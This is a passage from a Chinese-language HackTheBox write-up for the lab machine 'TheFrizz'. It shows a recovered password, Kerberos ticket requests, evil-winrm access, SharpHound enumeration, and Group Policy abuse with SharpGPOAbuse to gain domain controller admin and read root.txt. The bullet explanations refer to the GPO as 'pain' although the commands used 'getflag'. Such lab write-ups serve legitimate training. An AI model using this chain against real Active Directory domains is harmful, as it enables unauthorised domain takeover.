C:\\wapt\\conf\\ca-192.168.120.158.pem\nclients_signing_certificate = C:\\wapt\\conf\\ca-192.168.120.158.crt\n\n[tftpserver]\nroot_dir = c:\\wapt\\waptserver\\repository\\wads\\pxe\nlog_path = c:\\wapt\\\u003cspan class=\"hljs-built_in\"\u003elog\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e对\u003ccode\u003ewapt_password\u003c/code\u003e进行解码，得到密码\u003ccode\u003e!suBcig@MehTed!R\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason7-TheFrizz/image53.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e经过测试，最后知道密码是\u003ccode\u003eM.SchoolBus\u003c/code\u003e用户的\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003entpdate -s 10.129.224.51\ngetTGT.py frizz.htb/M.SchoolBus:\u003cspan class=\"hljs-string\"\u003e'!suBcig@MehTed!R'\u003c/span\u003e -dc-ip frizzdc.frizz.htb\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason7-TheFrizz/image54.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e使用新的票据进行\u003ccode\u003eevil\u003c/code\u003e登录，成功登录\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e⚡ root@kali  ~/Desktop/test/TheFrizz  \u003cspan class=\"hljs-built_in\"\u003eexport\u003c/span\u003e KRB5CCNAME=M.SchoolBus.ccache\n ⚡ root@kali  ~/Desktop/test/TheFrizz  ntpdate -s 10.129.224.51            \n\u003cspan class=\"hljs-built_in\"\u003esudo\u003c/span\u003e evil-winrm -i frizzdc.frizz.htb -r frizz.htb -k M.SchoolBus.ccache\n                                                                       \nEvil-WinRM shell v3.7          \nWarning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() \u003cspan class=\"hljs-keyword\"\u003efunction\u003c/span\u003e is unimplemented on this machine                      \n                                                                       \nData: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                        \n                                                                                                                                                             \nWarning: Useless cert/s provided, SSL is not enabled                   \n                                                                       \nInfo: Establishing connection to remote endpoint                              \n*Evil-WinRM* PS C:\\Users\\M.SchoolBus\\Documents\u003e     \n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003e提权\u003c/h2\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e*Evil-WinRM* PS C:\\Users\\M.SchoolBus\u003e ./SharpHound.exe -c all\n2025-03-18T07:02:16.4901041-07:00|INFORMATION|This version of SharpHound is compatible with the 4.3.1 Release of BloodHound\n2025-03-18T07:02:16.6463559-07:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote\n2025-03-18T07:02:16.6776043-07:00|INFORMATION|Initializing SharpHound at 7:02 AM on 3/18/2025\n2025-03-18T07:02:16.7869804-07:00|INFORMATION|[CommonLib LDAPUtils]Found usable Domain Controller \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e frizz.htb : frizzdc.frizz.htb\n2025-03-18T07:02:17.0369968-07:00|INFORMATION|Loaded cache with stats: 70 ID to \u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e mappings.\n 70 name to SID mappings.\n 0 machine sid mappings.\n 2 sid to domain mappings.\n 0 global catalog mappings.\n2025-03-18T07:02:17.0526049-07:00|INFORMATION|Flags: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote\n2025-03-18T07:02:17.2088556-07:00|INFORMATION|Beginning LDAP search \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e frizz.htb\n2025-03-18T07:02:17.2557291-07:00|INFORMATION|Producer has finished, closing LDAP channel\n2025-03-18T07:02:17.2557291-07:00|INFORMATION|LDAP channel closed, waiting \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e consumers\n2025-03-18T07:02:47.2244906-07:00|INFORMATION|Status: 0 objects finished (+0 0)/s -- Using 39 MB RAM\n2025-03-18T07:03:04.5682491-07:00|INFORMATION|Consumers finished, closing output channel\nClosing writers\n2025-03-18T07:03:04.6151161-07:00|INFORMATION|Output channel closed, waiting \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e output task to complete\n2025-03-18T07:03:04.7244793-07:00|INFORMATION|Status: 112 objects finished (+112 2.382979)/s -- Using 44 MB RAM\n2025-03-18T07:03:04.7244793-07:00|INFORMATION|Enumeration finished \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e 00:00:47.5265832\n2025-03-18T07:03:04.8182454-07:00|INFORMATION|Saving cache with stats: 70 ID to \u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e mappings.\n 70 name to SID mappings.\n 0 machine sid mappings.\n 2 sid to domain mappings.\n 0 global catalog mappings.\n2025-03-18T07:03:04.8338673-07:00|INFORMATION|SharpHound Enumeration Completed at 7:03 AM on 3/18/2025! Happy Graphing!\n\n*Evil-WinRM* PS C:\\Users\\M.SchoolBus\u003e download 20250318070304_BloodHound.zip\n\n                                        \nInfo: Downloading C:\\Users\\M.SchoolBus\\20250318070304_BloodHound.zip to 20250318070304_BloodHound.zip\n                                        \nInfo: Download successful!\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e导入BloodHound，这里我导入的数据会比他们少点，这里我贴他们的图\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason7-TheFrizz/image55.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e可以看到\u003ccode\u003eM.SchoolBus\u003c/code\u003e对\u003ccode\u003eClass_Frizz@Frizz.htb\u003c/code\u003e有write权限，并且对\u003ccode\u003eDomain Controllers@Frizz.htb\u003c/code\u003e有写权限，那么就存在GPO滥用\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eWriteGPO Link（写入 GPO 组策略的权限）\u003c/strong\u003e，表明它能够修改组策略，可能导致域权限提升（Privilege Escalation）。\u003c/p\u003e\n\u003cp\u003e利用工具：\u003ca href=\"https://github.com/FSecureLABS/SharpGPOAbuse\"\u003ehttps://github.com/FSecureLABS/SharpGPOAbuse\u003c/a\u003e | \u003ca href=\"https://github.com/byronkg/SharpGPOAbuse\"\u003ehttps://github.com/byronkg/SharpGPOAbuse\u003c/a\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e*Evil-WinRM* PS C:\\Users\\M.SchoolBus\\Documents\u003e upload SharpGPOAbuse.exe\nInfo: Uploading /root/Desktop/test/TheFrizz/SharpGPOAbuse.exe to C:\\Users\\M.SchoolBus\\Documents\\SharpGPOAbuse.exe\nData: 107860 bytes of 107860 bytes copied\nInfo: Upload successful!                                                                                                                                          \n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e*Evil-WinRM* PS C:\\Users\\M.SchoolBus\\Documents\u003e New-GPO -Name getflag | New-GPLink -Target \u003cspan class=\"hljs-string\"\u003e\"OU=DOMAIN CONTROLLERS,DC=FRIZZ,DC=HTB\"\u003c/span\u003e -LinkEnabled Yes         \nGpoId       : 236e8f45-c46e-4962-9cec-9d69350ddb93                                                                                                           \nDisplayName : getflag                                                                                                                                        \nEnabled     : True                                                                                                                                           \nEnforced    : False                                                                                                                                          \nTarget      : OU=Domain Controllers,DC=frizz,DC=htb                                                                                                          \nOrder       : 2    \n\u003c/code\u003e\u003c/pre\u003e\n\u003cul\u003e\n\u003cli\u003e**\u003ccode\u003eNew-GPO -Name** getflag\u003c/code\u003e：创建一个新的组策略对象（GPO），名称为 \u003ccode\u003egetflag\u003c/code\u003e。\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003eNew-GPLink -Target \"OU=DOMAIN CONTROLLERS,DC=FRIZZ,DC=HTB\" -LinkEnabled Yes\u003c/code\u003e\u003c/strong\u003e：\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003eNew-GPLink\u003c/code\u003e 用于将 GPO 链接到指定的 OU（组织单位）。\u003c/li\u003e\n\u003cli\u003e这里的目标是 \u003ccode\u003eOU=DOMAIN CONTROLLERS,DC=FRIZZ,DC=HTB\u003c/code\u003e，即 \u003cstrong\u003e域控制器 (DC) 组织单位\u003c/strong\u003e，表示该 GPO 作用于整个 Active Directory 域控制器。\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eLinkEnabled Yes\u003c/code\u003e 表示启用这个 GPO。\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e*Evil-WinRM* PS C:\\Users\\M.SchoolBus\\Documents\u003e .\\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount M.SchoolBus --GPOName getflag\n[+] Domain = frizz.htb                                                                                                                                       \n[+] Domain Controller = frizzdc.frizz.htb\n[+] Distinguished Name = CN=Policies,CN=System,DC=frizz,DC=htb\n[+] SID Value of M.SchoolBus = S-1-5-21-2386970044-1145388522-2932701813-1106\n[+] GUID of \u003cspan class=\"hljs-string\"\u003e\"getflag\"\u003c/span\u003e is: {236E8F45-C46E-4962-9CEC-9D69350DDB93}\n[+] Creating file \\\\frizz.htb\\SysVol\\frizz.htb\\Policies\\{236E8F45-C46E-4962-9CEC-9D69350DDB93}\\Machine\\Microsoft\\Windows NT\\SecEdit\\GptTmpl.inf\n[+] versionNumber attribute changed successfully\n[+] The version number \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e GPT.ini was increased successfully.\n[+] The GPO was modified to include a new \u003cspan class=\"hljs-built_in\"\u003elocal\u003c/span\u003e admin. Wait \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e the GPO refresh cycle.\n[+] Done!\n\u003c/code\u003e\u003c/pre\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003eSharpGPOAbuse.exe --AddLocalAdmin\u003c/code\u003e\u003c/strong\u003e：\n\u003cul\u003e\n\u003cli\u003e该命令使用 \u003cstrong\u003eSharpGPOAbuse\u003c/strong\u003e 工具修改 \u003ccode\u003epain\u003c/code\u003e 这个 GPO，使得 \u003ccode\u003eM.SchoolBus\u003c/code\u003e 这个用户被添加为本地管理员。\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-UserAccount M.SchoolBus\u003c/code\u003e\u003c/strong\u003e：\n\u003cul\u003e\n\u003cli\u003e目标用户是 \u003ccode\u003eM.SchoolBus\u003c/code\u003e，意味着攻击者希望让该用户获得本地管理员权限。\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-GPOName pain\u003c/code\u003e\u003c/strong\u003e：\n\u003cul\u003e\n\u003cli\u003e指定要修改的 GPO 名称是 \u003ccode\u003epain\u003c/code\u003e（之前创建的 GPO）\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e*Evil-WinRM* PS C:\\Users\\M.SchoolBus\\Documents\u003e gpupdate /force                                                                                              \nUpdating policy...                                                                                                                                                                                                                                                                                                                                                                                                                           \nComputer Policy update has completed successfully. \n\u003c/code\u003e\u003c/pre\u003e\n\u003cul\u003e\n\u003cli\u003e这个命令 \u003cstrong\u003e强制更新\u003c/strong\u003e 组策略，使得 \u003ccode\u003epain\u003c/code\u003e GPO 立即生效。\u003c/li\u003e\n\u003cli\u003e这样，\u003ccode\u003eM.SchoolBus\u003c/code\u003e 用户就会被成功添加到本地管理员组。\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e最后读取\u003ccode\u003eRoot.txt\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e*Evil-WinRM* PS C:\\Users\\M.SchoolBus\\Documents\u003e \u003cspan class=\"hljs-built_in\"\u003etype\u003c/span\u003e C:\\Users\\Administrator\\Desktop\\root.txt                                                                 \n8f40592b0321c70f59d101a0d640a0c2 \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e再查看一下权限\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e*Evil-WinRM* PS C:\\Users\\M.SchoolBus\\Documents\u003e \u003cspan class=\"hljs-built_in\"\u003ewhoami\u003c/span\u003e /priv                                                                                11:05:33 [5/1663]\n                                                                                                                                                             \nPRIVILEGES INFORMATION                                                                                                                                       \n----------------------                                                                                                                                       \n                                                                              \nPrivilege Name                            Description                                                        State             \n========================================= ================================================================== =======                                         \nSeIncreaseQuotaPrivilege                  Adjust memory quotas \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e a process                                 Enabled\nSeMachineAccountPrivilege                 Add workstations to domain                                         Enabled\nSeSecurityPrivilege                       Manage auditing and security \u003cspan class=\"hljs-built_in\"\u003elog\u003c/span\u003e                                   Enabled\nSeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled\nSeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled                           \nSeSystemProfilePrivilege                  Profile system performance                                         Enabled\nSeSystemtimePrivilege                     Change the system \u003cspan class=\"hljs-keyword\"\u003etime\u003c/span\u003e                                             Enabled\nSeProfileSingleProcessPrivilege           Profile single process                                             Enabled\nSeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled\nSeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled\nSeBackupPrivilege                         Back up files and directories                                      Enabled\nSeRestorePrivilege                        Restore files and directories                                      Enabled\nSeShutdownPrivilege                       Shut down the system                                               Enabled\nSeDebugPrivilege                          Debug programs                                                     Enabled\nSeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled\nSeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled\nSeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Enabled\nSeUndockPrivilege                         Remove computer from docking station                               Enabled\nSeEnableDelegationPrivilege               Enable computer and user accounts to be trusted \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e delegation     Enabled\nSeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled\nSeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled\nSeCreateGlobalPrivilege                   Create global objects                                              Enabled\nSeIncreaseWorkingSetPrivilege             Increase a process working \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e                                     Enabled\nSeTimeZonePrivilege                       Change the \u003cspan class=\"hljs-keyword\"\u003etime\u003c/span\u003e zone                                               Enabled\nSeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled\nSeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e another user \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e the same session Enabled\n\u003c/code\u003e\u003c/pre\u003e\n\u003ch2\u003e总结\u003c/h2\u003e\n\u003cp\u003e学习到\u003ccode\u003eGPO\u003c/code\u003e 滥用，BloodHound。并且还有回收站\u003ccode\u003eC:\\$Recycle.Bin\u003c/code\u003e 可能会藏数据（雾），还有就是新加坡节点问题太多了\u003c/p\u003e","title":"HackTheBox - Season7-TheFrizz","date":"2025-04-04","updated":"2025-04-04","comments":true,"tags":["HackTheBox","域渗透","Windows靶机","encrypt"],"categories":"靶机","isEncrypted":true}},"__N_SSG":true},"page":"/[year]/[month]/[day]/[id]","query":{"year":"2025","month":"04","day":"04","id":"HackTheBoxSeason7-TheFrizz"},"buildId":"3utQ6Fx9dsgm1XbZvmWuw","isFallback":false,"gsp":true,"scriptLoader":[]}</script></body></html>